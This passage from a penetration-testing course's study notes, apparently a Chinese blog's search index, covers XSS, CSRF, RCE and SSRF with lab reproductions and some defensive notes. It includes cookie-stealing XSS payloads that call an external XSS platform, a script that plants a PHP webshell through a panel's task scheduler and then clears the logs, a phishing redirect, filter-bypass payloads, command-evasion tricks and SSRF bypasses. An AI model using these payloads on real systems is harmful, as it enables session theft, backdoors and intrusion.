CVE-2021-34506Edge浏览器翻译功能导致JS语句被调用执行https://www.bilibili.com/video/BV1fX4y1c7rX\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"054-Web攻防-XSS平台&复现源码&其他环境等","url":"/2025/09/16/054-Web%E6%94%BB%E9%98%B2-XSS%E5%B9%B3%E5%8F%B0&%E5%A4%8D%E7%8E%B0%E6%BA%90%E7%A0%81&%E5%85%B6%E4%BB%96%E7%8E%AF%E5%A2%83%E7%AD%89/","content":"054-Web攻防-XSS平台&amp;复现源码&amp;其他环境等知识点\n\n1、XSS跨站-攻击利用-凭据盗取\n2、XSS跨站-攻击利用-数据提交\n3、XSS跨站-攻击利用-网络钓鱼\n4、XSS跨站-攻击利用-溯源综合\n\n\n漏洞原理：接受输入数据，输出显示数据后解析执行基础类型：反射(非持续)，存储(持续)，DOM-BASE\n拓展类型：jquery，mxss，uxss，pdfxss，flashxss，上传xss等\n常用标签：https://www.freebuf.com/articles/web/340080.html\n攻击利用：盲打，COOKIE盗取，凭据窃取，页面劫持，网络钓鱼，权限维持等\n安全修复：字符过滤，实例化编码，http_only，CSP防护，WAF拦截等\n测试流程：看输出想输入在哪里，更改输入代码看执行（标签，过滤决定）\n\n前情提要\n0、XSS跨站-攻击利用-Cookie盗取条件：无防护Cookie凭据获取\n利用：xss平台或手写代码\n触发代码\n&lt;script src =https://xs.pe/WFb.jpg&gt;&lt;/script&gt;\n\n简单案例-小皮面板\n漏洞环境：小皮面板\nxss平台：https://xssaq.com/\n漏洞复现：\n\n在本地部署一个小皮面板访问后台管理路径 在用户名上面输入我们payload &lt;sCRiPt sRC=//xs.pe/WFb&gt;&lt;/sCrIpT&gt;\n然后进行几次登录尝试 密码随便只要验证码正确就行 \n打开另一个浏览器访问小皮后台路径进行登录  访问操作日志可以看到弹窗 \n返回xss在线平台 点击xss访问记录点击查看即可看到详情信息\n\n\n\n\n\n\n1、XSS跨站-攻击利用-凭据窃取漏洞环境：骑士财\n漏洞复现\n\n本地搭建平台 使用测试账号密码登入\n个人中心 设置 这里有个结算信息可以提交我们的payload&lt;sCRiPt sRC=//xs.pe/n0L&gt;&lt;/sCrIpT&gt;黑盒情况下随便插 返回我们的主页申请提现\n登录后台管理页面 查看提现申请 触发xss代码 \n返回我们的xss平台可以拿到骑士才平台的PHP session 复制 \n新开一个浏览器访问后台路径 打开f12 选择应用的cookie改为我们盗取的cookie 回车 最后成功登录后台\n\n\n\n\n\n\n\n\n\n2、XSS跨站-攻击利用-数据提交条件：熟悉后台业务功能的数据包，利用js写一个模拟提交\n利用：凭据获取不到或有防护无法利用凭据进入时执行其他\nfunction poc()&#123;  $.get(&#x27;/service/app/tasks.php?type=task_list&#x27;,&#123;&#125;,function(data)&#123;    var id=data.data[0].ID;    $.post(&#x27;/service/app/tasks.php?type=exec_task&#x27;,&#123;      tid:id    &#125;,function(res2)&#123;        $.post(&#x27;/service/app/log.php?type=clearlog&#x27;,&#123;                    &#125;,function(res3)&#123;&#125;,&quot;json&quot;);                  &#125;,&quot;json&quot;);  &#125;,&quot;json&quot;);&#125;function save()&#123;  var data=new Object();  data.task_id=&quot;&quot;;  data.title=&quot;test&quot;;  data.exec_cycle=&quot;1&quot;;  data.week=&quot;1&quot;;  data.day=&quot;3&quot;;  data.hour=&quot;14&quot;;  data.minute = &quot;20&quot;;  data.shell=&#x27;echo &quot;&lt;?php @eval($_POST[123]);?&gt;&quot; &gt;D:/xp.cn/www/wwwroot/admin/localhost_80/wwwroot/1.php&#x27;;  $.post(&#x27;/service/app/tasks.php?type=save_shell&#x27;,data,function(res)&#123;    poc();  &#125;,&#x27;json&#x27;);&#125;save();\n\n漏洞复现：\n\n在xss在线平台创建完项目后自定义代码 将上面的代码复制进去 \n登录后台管理路径将payload复制上去 进行登录\n打开小皮面板后台查看操作日志 后查看文件 发现创建了1.php文件\n\n\n\n\n3、XSS跨站-攻击利用-网络钓鱼1.部署可访问的钓鱼页面并修改\n2.植入xss代码的后代受害者触发\n3.将后门及其正常文件捆绑打包免杀\n&lt;script&gt;alert(&#x27;当前浏览器Flash版本过低，请下载升级！&#x27;);location.href=&#x27;http://x.x.x.x/flash&#x27;&lt;/script&gt;\n\n漏洞复现-Flash钓鱼攻击\n\n本地准备了一个flash钓鱼页面  打开源代码 修改将里面的下载链接修改为后门地址 我这里改为了xss触发平台的链接\n\n依旧是使用骑士财 在个人设置那里进行 将payload插入\n\n&lt;script&gt;alert(&#39;当前浏览器Flash版本过低，请下载升级！&#39;);location.href=&#39;http://192.168.162.149:82&#39;&lt;/script&gt;\n\n在个人设置中心里面将我的佣金 进行申请结算（如果没有佣金了可以去数据库进行修改 user表里面）\n\n当我们再访问后台的申请提现页面就会出现弹窗 点击确定就会去伪造的flash钓鱼界面\n\n点击立即下载就会访问xss平台的payload\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n4、XSS跨站-攻击利用-溯源综合XSS数据平台-XSSReceiver(这是给个人搭建的XSS平台，不想使用网上的XSS平台可以用这个项目)\n简单配置即可使用，无需数据库，无需其他组件支持\n项目地址：https://github.com/epoch99/BlueLotus_XSSReceiver-master\n搭建非常简单，下载源码下来放入phpstudy目录下访问安装即可 \n详情看这  web安全—XSS利用平台BLUE-LOTUS安装与使用\n浏览器控制框架-beef-xss\n只需执行JS文件，即可实现对当前浏览器的控制，可配合各类手法利用缺点：如果对方浏览器关闭，权限就会掉搭建：beef-xss详细教程(一文带你学会beef) | Kali下安装beef | beef-xss反射型，储存型利用 | beef实现Cookie会话劫持 | 键盘监听 | 浏览器弹窗，重定向等\n简单案例\n\n依旧是用骑士财 在个人中心设置里面吗输入我们的payload \n去我的佣金里面申请结算\n登录管理员后台账号查看\n最后返回beef查看在线浏览器\n\n\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"055-Web攻防-XSS防御&HttpOnly&CSP&靶场工具等","url":"/2025/09/16/055-Web%E6%94%BB%E9%98%B2-XSS%E9%98%B2%E5%BE%A1&HttpOnly&CSP&%E9%9D%B6%E5%9C%BA%E5%B7%A5%E5%85%B7%E7%AD%89/","content":"055-Web攻防-XSS防御&amp;HttpOnly&amp;CSP&amp;靶场工具等知识点\n1、XSS跨站-安全防御-CSP策略2、XSS跨站-安全防御-HttpOnly3、XSS跨站-安全防御-XSSFilter\n常用标签：xss 常用标签及绕过姿势总结 - FreeBuf网络安全行业门户https://xz.aliyun.com/t/4067\n1.XSS跨站-安全防御-CSPCSP (Content Security Policy 内容安全策略)  各种语言都存在，只不过设置不同内容安全策略是一种可信白名单机制，来限制网站中是否可以包含某来源内容。该制度明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单(当外部资源不在白名单内，禁止网站访问外部资源)，它的实现和执行全部由浏览器完成，开发者只需提供配置。禁止加载外域代码，防止复杂的攻击逻辑。禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。合理使用上报可以及时发现XSS，利于尽快修复问题。\n\n简单案例\n\nheader(&quot;Content-Security-Policy:img-src &#39;self&#39; &quot;);开启之后只允许加载本地源图片：\n* ![image-20250525164140032](/img/image-20250525164140032.png)* ![image-20250525171017228](/img/image-20250525171017228.png)* ![image-20250525164224347](/img/image-20250525164224347.png)* 开启CSP后XSS的加载情况* ![image-20250525171906600](/img/image-20250525171906600.png)* 未开启CSP后XSS的加载情况* 图片加载成功 平台也收到了图片的访问记录* ![image-20250525171056934](/img/image-20250525171056934.png)* ![image-20250525171115721](/img/image-20250525171115721.png)  **绕过方法：有但鸡肋**  https://xz.aliyun.com/t/12370  [Web安全2.3：CSP安全策略、Cookie、Session、同源策略、HTML DOM树_同源策略与内容安全策略的区别-CSDN博客](https://blog.csdn.net/a1766855068/article/details/89370320)### 2. XSS跨站-安全防御-HttpOnly\n禁止页面的JavaScript访问带有HttpOnly属性的Cookie。\nphp和java都有该设置\n\n\n\nPHP.INI设置或代码引用，三种方式设置：-session.cookie_httponly &#x3D;1-ini_set(“session.cookie_httponly”, 1);-setcookie(‘’, ‘’, time() + 3600, ‘&#x2F;xss’, ‘’, false, true);\n**简单案例** * 没有开启HttpOnly时XSS窃取Cookie的加载情况* ![image-20250525172659971](/img/image-20250525172659971.png)* ![image-20250525172823145](/img/image-20250525172823145.png)* ![image-20250525172951831](/img/image-20250525172951831.png)开启HttpOnly时XSS窃取Cookie的加载情况* ![image-20250525173342089](/img/image-20250525173342089.png)* ![image-20250525173354127](/img/image-20250525173354127.png)* ![image-20250525173429055](/img/image-20250525173429055.png)绕过：有但鸡肋(1) CVE-2012-0053(2) PHPINFO页面/(3) Flash/Java参考文章：[XSS攻击之HttpOnly绕过-CSDN博客](https://blog.csdn.net/weixin_42478365/article/details/116597222)思路：不[获取Cookie](https://so.csdn.net/so/search?q=获取Cookie&amp;spm=1001.2101.3001.7020)采用方式（钓鱼，浏览器攻击框架等）### 3. XSS跨站-安全防御-XSSFilter(过滤器的意思)检查用户输入的数据中是否包含特殊字符， 如&lt;、&gt;、’、”,进行实体化等。实验：手工分析&amp;工具分析Xss-Lab 标签及常见过滤绕过环境下载：GitHub - Re13orn/xss-lab: 20 level xss lab by network!!!常用标签：xss 常用标签及绕过姿势总结 - FreeBuf网络安全行业门户https://xz.aliyun.com/t/4067工具下载项目：GitHub - s0md3v/XSStrike: Most advanced XSS scanner.工具使用参考地址：xss测试工具xsstrike(基于python3）-CSDN博客 #### **1.无任何过滤**\nalert(1)\n![image-20250525175313506](/img/image-20250525175313506.png)![image-20250525175258197](/img/image-20250525175258197.png)#### 2、实体化 输入框没有* 这里将&lt;&gt;实体化了* 这里“”将代码过滤了要进行过滤  我们要闭合左右两个“ ”是得代码能够执行* ```  &quot;&gt; &lt;script&gt;alert()&lt;/script&gt; &lt;&quot;//&lt;&gt;标签前面有空格\n\n\n\n\n3、全部实体化 利用标签事件 单引号闭合\n这关输入上关的代码发现 这里将“ ”实体化了 我们要绕过实体化 这里可以使用input标签事件\n\n&#39; onfocus=javascript:alert() &#39;//这里单元号前面有空格\n![image-20250525182121152](/img/image-20250525182121152.png)![image-20250525182537738](/img/image-20250525182537738.png)#### 4、全部实体化 利用标签事件 双引号闭合* 这里发现是使用双引号进行闭合的\n&quot; onfocus=javascript:alert() &quot;\n\n\n\n![image-20250525182947191](/img/image-20250525182947191.png)####  5、事件关键字过滤 利用其他标签调用 双引号闭合* 它这里对onfocus时间进行了过滤将on变为了on_* 这里使用其他事件进行绕过* ```  &quot;&gt; &lt;a href=javascript:alert()&gt;xxx&lt;/a&gt; &lt;&quot;\n\n\n\n6、利用大小写未正则匹配\n这关对我的script进行了过滤 我们这里使用大小写绕过\n\n&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt; &lt;&quot;\n* ![image-20250525183834350](/img/image-20250525183834350.png)#### 7、利用双写绕过匹配* 这一关输入代码后发现 直接将我们的script过滤为空了* 我们使用上一关的代码在这原有的基础上面在加一成* ```  &quot;&gt; &lt;sCscriptript&gt;alert()&lt;/sCscriptript&gt; &lt;&quot;  或者  &quot;&gt; &lt;a hrehreff=javasscriptcript:alert()&gt;x&lt;/a&gt; &lt;&quot;\n\n![image-20250525184237006](/img/image-20250525184237006.png)\n\n\n\n\n8、利用Unicode编码\n这里输入代码点击友情链接后发现会对我们的代码进行过滤\n我们这里对我们的代码进行unicode编码之后进行输入\n\njavascript:alert()unicode编码后：&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0029\n\n\n\n\n9、利用Unicode编码（内容检测）\n这里对http进行了检测\n\n&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0029;(&#x27;http://&#x27;)\n\n\n\n11、隐藏属性触发闭合\n这里对输入框进行了隐藏 如果在黑盒中 这三个隐藏都要进行测试\n\n将hidden删除 输入下面的代码\n\n?t_sort=&quot; onfocus=javascript:alert() type=&quot;txt\n* ![image-20250525195909421](/img/image-20250525195909421.png)* ![image-20250525200123445](/img/image-20250525200123445.png)#### 11-20[xss-labs靶场实战全通关详细过程（xss靶场详解）-CSDN博客](https://blog.csdn.net/l2872253606/article/details/125638898)**黑盒XSS手工分析：**1、页面中显示的数据找可控的（有些隐藏的）2、利用可控地方发送JS代码去看执行加载情况3、成功执行即XSS，不能成功就看语句输出的地方显示（过滤）4、根据显示分析为什么不能执行（实体化，符号括起来，关键字被删除等）实体化基本绕过不了### XSStrike工具的安装及使用（包括实战应用）[XSStrike工具的安装及使用（包括实战应用）](https://blog.csdn.net/m0_73353130/article/details/130425618)* XSStrike是一款检测Cross Site Scripting的高级检测工具。它集成了payload生成器、爬虫和模糊引擎功能。XSStrike不是像其他工具那样注入有效负载并检查其工作，而是通过多个解析器分析响应，然后通过与模糊引擎集成的上下文分析来保证有效负载。除此之外，XSStrike还具有爬行，模糊测试，参数发现，WAF检测功能。它还会扫描DOM XSS漏洞。\n\n\n\n&lt;a%0aonPointeREnTer%0d&#x3D;%0dconfirm()%0dx&gt;v3dm0s\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"056-Web攻防-CSRF&复现CMS&本地Demo等源码","url":"/2025/09/16/056-Web%E6%94%BB%E9%98%B2-CSRF&%E5%A4%8D%E7%8E%B0CMS&%E6%9C%AC%E5%9C%B0Demo%E7%AD%89%E6%BA%90%E7%A0%81/","content":"056-Web攻防-CSRF&amp;复现CMS&amp;本地Demo等源码​\t知识点\n\n1、CSRF-原理&amp;检测&amp;利用&amp;防御\n2、CSRF-防御-Referer策略隐患\n3、CSRF-防御-Token校验策略隐患\n\ncsrf攻击流程\n\ncsrf实战工攻击所需条件\n\n1.CSRF-无检测防护-检测&amp;生成&amp;利用检测：黑盒手工利用测试，白盒看代码检验（有无 token，来源检验等）\n生成：BurpSuite-&gt;Engagement tools-&gt;Generate CSRF Poc\n利用：将文件防止自己的站点下，诱使受害者访问（或配合 XSS 触发访问）\n**简单案例 **\n\n首先我们在本地搭建一个管理平台 在账户管理这里新建账户 \n\n保存新建用户 并对其进行抓包 BurpSuite-&gt;Engagement tools-&gt;Generate CSRF Poc（注：这个功能只有2022年版本的burpsuite才有）\n\n会生成一段代码 点击options 里面的include auto-submit script勾选 ，去掉最后一段显示按钮的代码  如果不勾选会在页面上显示一个点击按钮才能触发代码 这不是我们想要的 勾选完记得点击左下角 Regenerate重新加载按钮生成payload  \n\n将我的写好的payload文件编译成html放在放在网站目录下面 \n\n我们去访问网站 http://t11/1.html 就会成功触发payload\n\n接着登录管理员用户 查看账户管理 user已经成功添加\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n如何防护CSRF第一种\n对数据包的Referer字段进行检测\n![6f0d8d1a0aba2f37bcd4c1bc54ee81c8 (1)](C:\\Users\\liuyuanbiao\\Desktop\\BlogPhoto\\6f0d8d1a0aba2f37bcd4c1bc54ee81c8 (1).png)\n简单案例\n\n在本地搭建一个zblog 不会搭建的看这里 -&gt; zblog搭建个人博客网站&#x2F;安装教程手把手教你搭建\n\n在用户管理这里新建用户 并用burpsuite抓包\n\n将抓到的包同样生成 CSRF Poc跟上面一样\n\n新建txt 将payload放到txt下面修改后缀为html将其放到网站目录下面\n\n接着去访问 \n\n\n\n\n\n\n\n\n\n\n2. CSRF-Referer同源-代码逻辑&amp;上传&amp;XSS 如何绕过检测\n\n来源检测\n1、基于严谨的检测绕过\n\n全部对比\n\n2、基于不严谨的检测绕过\n\n匹配对比\n\n\n检测是否同源目标机http://8.130.135.53:83/\n攻击机 http://47.94.236.117/\n检测来源是否是8.130.135.53:83&#x2F; 同源就行\n全部对比：\n\n一一对应\n\n匹配对比：\n\n有这个值\n基于逻辑的判断\n\n1.匹配对比：有这个值      基于不严谨的检测绕过\n条件：点击过来的\n直接访问：http://47.94.236.117\nhttp://47.94.236.117/8.130.135.52:83/1.html\n简单案例\n\n网站访问http://47.94.236.117/2.html  在源为Refererhttp://47.94.236.117/\n\n如果把2.html放在目录下面创建个目录 名为 http://8.130.135.53:83/2.html那么合起来就是\n\nhttp://47.94.236.117/ http://8.130.135.53:83 （实战中无法使用 因为不能创建带有&#x2F;&#x2F;的目录 这里只提供有一种思路）\n\n\n\n2.逻辑的判断隐患\n简单案例\n\n如果直接去访问http://zblog:86/2.html 会显示非法访问\n我们修改2.html代码 在html头上加上&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;这段\n然后在  (http://zblog:86/2.html)  抓包访问里面是没有referer 发送 显示操作成功\n\n\n\n\n\n\n在Zblog里面的代码来源里面 这段代码显示在代码没有来源的时候返回true 因为网站的一些功能的实现 本身就没来源 这就给了我们钻空子的机会 \n因此在生成payload的时候在代码头部加上  有可能能绕过对来源的检测\n或者要么就是置空 删除来源 放空提交也有可能绕过\n\n\n1.全部对比：一一对应       基于严谨的检测绕过 \n严谨对比 受害者无法更改来源检测 保证了Referer是同一来源\n绕过方法：\n1.配合xss 或 2.上传(目的是：目标机触发数据包 Referer是同一来源)绕过检测\n3. CSRF-Token校验-值删除&amp;复用&amp;留空\n简单案例\n\n我们在本地搭建一个CSRF ToKen案例\n填写完信息后分别抓两次包 \n可以看到 两次抓包后的token值分别都不同\n**token的意义就是给每个数据包上了个编号 那个编号是随机产生的 CSRF攻击的时候 对方的浏览器token已经更新了 对比不上 代码判断为失效 **\ntoken的绕过方法（不严谨情况下）：复用 删除 置空\n\n\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"058-RCE代码命令执行过滤绕过异或无字符无回显方案黑白盒挖掘","url":"/2025/09/16/058-RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%BC%82%E6%88%96%E6%97%A0%E5%AD%97%E7%AC%A6%E6%97%A0%E5%9B%9E%E6%98%BE%E6%96%B9%E6%A1%88%E9%BB%91%E7%99%BD%E7%9B%92%E6%8C%96%E6%8E%98/","content":"第58天：RCE代码&amp;命令执行&amp;过滤绕过&amp;异或无字符&amp;无回显方案&amp;黑白盒挖掘案例演示\n\nRCE &amp; 代码执行 &amp; 命令执行\nRCE-利用&amp;绕过&amp;异或&amp;回显\n白盒-CTF-RCE代码命令执行\n黑盒-运行-RCE代码命令执行\n\n知识点\n1、RCE-原理-代码执行&amp;命令执行\n2、RCE-黑白盒-过滤绕过&amp;不回显方案\nRCE &amp; 代码执行 &amp; 命令执行RCE代码执行简单案例\nhttp://demo01/rce/test.php?c=phpinfo();\n\n$code&#x3D;phpinfo();\n\n将phpinfo（）;当做当前语言代码去执行 这就代码执行漏洞\n\n代码执行漏洞产生条件：可控变量code   触发函数eval\n\nPHP常见代码执行函数\n\n\n//eval()、assert()、preg_replace()、create_function()、\n//array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()\n* ![image-20250514214014521](/img/image-20250514214014521.png)* ![image-20250514214049096](/img/image-20250514214049096.png)* 代码执行： 脚本——java，php，python 产生——Web 源码、中间件平台、其他环境 检测——白盒 代码审计 检测——黑盒 漏扫工具、公开漏洞、手工看参数及功能点 防御——敏感函数禁用、变量过滤或固定、WAF 产品**RCE命令执行简单案例*** $cmd = ver `ver查看系统版本信息`* 将ver当作当前系统命令去执行 这就是命令执行函数* 产生条件：可控变量 cmd 触发函数system* PHP常见命令执行函数* &gt; //system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等 * ![image-20250514214602808](/img/image-20250514214602808.png)![image-20250514215037922](/img/image-20250514215037922.png)* 命令执行： 系统——Linux、Windows 产生——web 源码、中间件平台、其他环境 检测——白盒 代码审计 检测——黑盒 漏扫工具，公开漏洞，手工看参数及功能点 防御——敏感函数禁用、变量过滤或固定、WAF 产品**RCE代码执行 -&gt;命令执行*** 一般命令执行无法执行代码 但是可以调用执行 两者可以相互转换* 这里就是用eval函数执行了system命令 相当于eval(system(&#x27;ver&#x27;))   达成了代码执行和命令执行的相互转换![image-20250514215631058](/img/image-20250514215631058.png)![image-20250514215655607](/img/image-20250514215655607.png)**RCE命令执行 -&gt;代码执行*** 用php去运行代码 创建一个1.php文件里面写上phpinfo();* 在cmd里面 运行 php 1.php  * ![image-20250514220632916](/img/image-20250514220632916.png)* ``` touch  名字缩写.php echo  &#x27;&lt;?php eval($_POST[&#x27;888&#x27;]); ?&gt;&#x27;  &gt;  名字缩写.php\n\n\n\n\n2.Python：\neval exec subprocess os.system commands \n3.Java：\nJava 中没有类似 php 中 eval 函数这种直接可以将字符串转化为代码执行的函数，\n但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL\n等\nRCE-利用&amp;绕过&amp;异或&amp;回显\n在本地目录下面创建一个文件 夹 flag \n\n\n关键字过滤 - 过滤 flag\n如何通不同的方式读取flag\n通配符\nflag=fl*cat fl*cat ?la* //？代表占位符\n\n\n\n转义符号\nca\\t /fl\\agcat fl&#x27;&#x27;ag\n\n\n\n使用空变量∗ 和 *和∗和@，x , x,x,{x}绕过\nca$*t fl$*agca$@t fl$@ag //$@是linux里面声明变量 但是$@没有赋值 所以为空 因此干扰到了flag的匹配ca$5t f$5lagca$&#123;2&#125;t f$&#123;2&#125;lag\n\n\n\n拼接法\na=fl;b=ag;cat$IFS$a$b //$IFS代表空格 写不写无所谓\n\n\n反引号绕过\ncat `ls`   //在php中这个`反引号代表执行命令的意思   在当前目录下只有flag 用cat执行ls命令读取flag结果\n\n\n\n编码绕过\necho &#x27;flag&#x27; | base64cat `echo ZmxhZwo= | base64 -d`\n\n\n\n组合绝活\ntouch &quot;ag&quot;touch &quot;fl\\\\&quot;touch &quot;t \\\\&quot;touch &quot;ca\\\\&quot;ls -t &gt;shell  -t是指以时间来展示文件（从新到旧的顺序执行）sh shell#  \\指的是换行#  ls -t是将文本按时间排序输出#  ls -t &gt;shell  将输出输入到shell文件中#  sh将文本中的文字读取出来执行\n\n\n过滤执行命令（如cat tac等）\nmore:一页一页的显示档案内容 less:与 more 类似head:查看头几行tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看file -f:报错出具体内容sh /flag 2&gt;%261 //报错出文件内容curl file:///root/f/flagstrings flaguniq -c flagbash -v flagrev flag\n\n\n\n过滤执行空格\n%09（url传递）(cat%09flag.php)cat$&#123;IFS&#125;flaga=fl;b=ag;cat$IFS$a$b&#123;cat,flag&#125;\n\n\n\n\n\n\n就是传入的代码 使用正则匹配检测是否含有字母或数字（i 表示不区分大小写）。如果包含，就立即 die(&#39;hacker&#39;)。\n\n如何绕过？\n\n使用异或运算生成无符号的过滤\n\n1、异或：rce-xor.php &amp; rce-xor.py绕过\n\n会在当前目录下面生成一个res.txt \n\n再在pycharm中使用rce-xor.py 运行res.txt 输入你要执行的函数和命令就会在下方生成一段payload 放到浏览器执行 显示信息\n\n(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%05%09&quot;^&quot;%7e%60%7b&quot;);\n\n\n\n\n\n\n\n\n\n\n\n2.或: rce-xor-or.php &amp; rce-xor-or.py绕过\n\n这个跟上面的步骤一样\n\n(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%17%08%0f%01%0d%09&quot;|&quot;%60%60%60%60%60%60&quot;);\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"057-Web攻防-SSRF&Demo源码&Gopher项目等","url":"/2025/09/16/057-Web%E6%94%BB%E9%98%B2-SSRF&Demo%E6%BA%90%E7%A0%81&Gopher%E9%A1%B9%E7%9B%AE%E7%AD%89/","content":"057-Web攻防-SSRF&amp;Demo源码&amp;Gopher项目等知识点\n\n知识点：\n1、SSRF-原理-外部资源加载\n2、SSRF-利用-伪协议&amp;无回显\n3、SSRF-挖掘-业务功能&amp;URL参数\n\n案例演示\n\n1、SSRF-原理&amp;挖掘&amp;利用&amp;修复\n2、白盒 CTF-绕过&amp;伪协议&amp;审计点\n3、黑盒 WEB-业务功能&amp;URL 关键字\n\nSSRF-原理&amp;挖掘&amp;利用&amp;修复什么是SSRF漏洞原理：SSRF(Server-Side Request Forgery:服务器端请求伪造) ，一种由攻击者构造形成由服务端发起请求的一个安全漏洞;一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。\nSSRF形成的原因正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。\n\n\nSSRF漏洞挖掘黑盒探针：一、业务功能点:\n\n社交分享功能：获取超链接的标题等内容进行显示\n转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览\n在线翻译：给网址翻译对应网页的内容\n图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片\n图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验\n云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试\n网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作\n数据库内置功能：数据库的比如mongodb的copyDatabase函数\n邮件系统：比如接收邮件服务器地址\n编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等\n未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞\n\n特征：对数据进行了接受，并且对数据进行了功能性操作\n二、URL关键参数\n\nshare\nwap\nurl\nlink\nsrc\nsource\ntarget\nu\ndisplay\nsourceURl\nimageURL\ndomain\n\n白盒分析：代码审计 对（文件读取，加载，数据操作类的函数）进行检测\nhttp:&#x2F;&#x2F;  Web常见访问，如http://127.0.0.1?url=http://127.0.0.1/flag.php 拿到flag(常用)\n\n\n\nfile:&#x2F;&#x2F;&#x2F; 从文件系统中获取文件内容，如，file:///etc/passwd   file:///var/www/html/flag.php(常用)\n\n\n\ndict:&#x2F;&#x2F; 字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info  dict:&#x2F;&#x2F;127.0.0.1:端口 (常用)\n\n\nsftp:&#x2F;&#x2F; SSH文件传输协议或安全文件传输协议\nftp协议   (扫描端口极其好用)\nldap:&#x2F;&#x2F; 轻量级目录访问协议\ntftp:&#x2F;&#x2F; 简单文件传输协议\ngopher:&#x2F;&#x2F; 分布式文档传递服务，可使用gopherus生成payload(常用)\n由于有部分协议http这类不支持，可以gopher来进行通讯（mysql，redis等)\n\n分布式文档传递服务，可使用gopherus生成payload有部分服务是http协议不支持通讯的，那么可以用gopher来进行通讯（如mysql，redis服务等）应用：漏洞利用 或 信息收集 通讯相关服务的时候 工具：Gopherus\n\n\n应用：漏洞利用 或 信息收集 通讯相关服务的时候 工具：Gopheru\n\nSSRF绕过方式\n-限制为http://www.xxx.com 域名采用http基本身份认证的方式绕过，即@\nhttp://www.xxx.com@www.xxyy.com\n-限制请求IP不为内网地址\n当不允许ip为内网地址时：\n（1）采取短网址绕过\n（2）采取域名解析\n（3）采取进制转换\n（4）采取3XX重定向\n\n白盒CTF-绕过&amp;伪协议&amp;审计点 练习环境：CTFSHOW SSRF 白盒\n351-无过滤直接获取\n利用url接受并处理POST方式，没有任何过滤\n\n两种方法\n\n利用服务器自己访问本地文件url=http://127.0.0.1/flag.php\n利用file协议从文件系统中获取flag url=file:///var/www/html/flag.php一般文件默认地址\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n351-351iP地址进制绕过\n从代码里面看到这里对127.0.0进行了过滤\n这里采用进制转换的方式绕过 url&#x3D;http://2130706433/flag.php\n\n\n\n\n\n\n\n八进制url&#x3D;http://0177.0.0.1/flag.php\n10 进制全部转换url&#x3D;http://2130706433/flag.php\n十六进制(需要添加上0x)0x的目的是为了表示后面的数是十六进制,在编程里面一般都要加入,用来区别十进制数url&#x3D;http://0x7F.0.0.1/flag.php\n还有一种特殊的省略模式127.0.0.1写成127.1\n用CIDR绕过localhosturl&#x3D;http://127.127.127.127/flag.php\n还有很多方式url&#x3D;http://0/flag.phpurl&#x3D;http://0.0.0.0/flag.php\n354-域名解析IP绕过\n这里对localhost和1跟0进行了过滤 \n域名解析绕过 test.xiaodi8.com -&gt; 127.0.0.1\nurl&#x3D;http://test.xiaodi8.com/flag.php\n\n\n\n\n\n![8be3b82824fc346714e7eafc2b43a183 (1)](C:\\Users\\liuyuanbiao\\Desktop\\BlogPhoto\\8be3b82824fc346714e7eafc2b43a183 (1).png)\n\n355-356长度限制IP绕过\n这里代码对传入的ip地址长度进行了限制 不能大于5\nhttp://0/ 实际上是 http://0.0.0.0/ 的一种表示方法\n\n\n0被解析为0.0.0.0\n而 0.0.0.0 被认为是 本地回环接口或监听所有地址（根据上下文不同）\n\n\n\n\n\n\n这里关和上面一样只不过这里的长度限制改为了3\n在POST data传入 